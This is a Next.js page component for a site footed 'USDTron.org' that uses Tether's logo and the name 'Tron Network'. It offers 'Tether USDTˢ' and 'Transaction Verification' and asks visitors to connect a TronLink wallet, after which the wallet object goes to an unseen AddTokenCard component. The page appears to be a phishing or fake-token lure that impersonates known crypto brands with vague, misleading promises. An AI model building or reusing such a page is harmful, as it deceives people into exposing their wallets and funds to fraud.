'use client';
import { useTronLink } from '@/app/hooks/useTronLink';
import WalletButton from '@/app/components/WalletButton';
import AddTokenCard from '@/app/components/AddTokenCard';
import { TOKEN, SOCIALS } from '@/config';

export default function Home() {
  const { address, tronWeb, status, error, connect, disconnect } = useTronLink();

  return (
    <main className="min-h-screen bg-[#050f0a] text-white flex flex-col">
      {/* Nav */}
      <nav className="flex items-center justify-between px-8 py-5 border-b border-white/10">
        <div className="flex items-center gap-2">
          <span className="w-8 h-8 rounded-full  flex items-center justify-center text-black font-black text-sm"><img src='https://assets.coingecko.com/coins/images/325/standard/Tether.png'/></span>
          <span className="font-bold text-lg tracking-tight">
            {/* {TOKEN.name} */}Tron Network
            </span>
        </div>
        <WalletButton status={status} address={address} onConnect={connect} onDisconnect={disconnect} />
      </nav>

      {/* Hero */}
      <section className="flex-1 flex flex-col items-center justify-center px-4 py-20">
        <div className="text-center mb-12">
          <div className="inline-block bg-green-400/10 border border-green-400/20 text-green-400 text-xs font-semibold px-4 py-1.5 rounded-full mb-6 uppercase tracking-widest">
            Carbon Economy · Tron Network
          </div>
          <h1 className="text-5xl md:text-7xl font-black tracking-tight mb-4">
            Get Your<br />
            <span className="text-green-400">Tether USDTˢ</span> 
          </h1>
          <h2><span className="text-green-400">Transaction Verification</span></h2>
          <p className="text-white/40 text-lg max-w-md mx-auto">
            Connect your TronLink wallet to verify your transaction. Which tokens sent directly to your wallet.
          </p>
        </div>

        {/* Not connected */}
        {status !== 'connected' && (
          <div className="flex flex-col items-center gap-4">
            <button
              onClick={connect}
              disabled={status === 'connecting'}
              className="bg-green-400 hover:bg-green-300 disabled:opacity-60 text-black font-bold text-lg px-10 py-4 rounded-2xl transition-all"
            >
              {status === 'connecting' ? 'Connecting...' : 'Connect TronLink'}
            </button>
            {error && <p className="text-red-400 text-sm max-w-xs text-center">{error}</p>}
            <p className="text-white/20 text-sm">
              Don&apos;t have TronLink?{' '}
              <a href="https://www.tronlink.org" target="_blank" rel="noopener noreferrer" className="text-green-400/60 hover:text-green-400 underline">
                Download here
              </a>
            </p>
          </div>
        )}

        {/* Connected */}
        {status === 'connected' && (
          <AddTokenCard address={address} tronWeb={tronWeb} />
        )}

        {/* Socials */}
        {(SOCIALS.twitter || SOCIALS.telegram || SOCIALS.instagram) && (
          <div className="flex items-center gap-6 mt-12">
            {SOCIALS.twitter && (
              <a href={SOCIALS.twitter} target="_blank" rel="noopener noreferrer" className="text-white/30 hover:text-white text-sm transition-colors">Twitter / X</a>
            )}
            {SOCIALS.telegram && (
              <a href={SOCIALS.telegram} target="_blank" rel="noopener noreferrer" className="text-white/30 hover:text-white text-sm transition-colors">Telegram</a>
            )}
            {SOCIALS.instagram && (
              <a href={SOCIALS.instagram} target="_blank" rel="noopener noreferrer" className="text-white/30 hover:text-white text-sm transition-colors">Instagram</a>
            )}
          </div>
        )}
      </section>

      {/* Footer */}
      <footer className="text-center py-6 border-t border-white/10 text-white/20 text-xs">
        © {new Date().getFullYear()} USDTron.org · Built on Tron
      </footer>
    </main>
  );
}
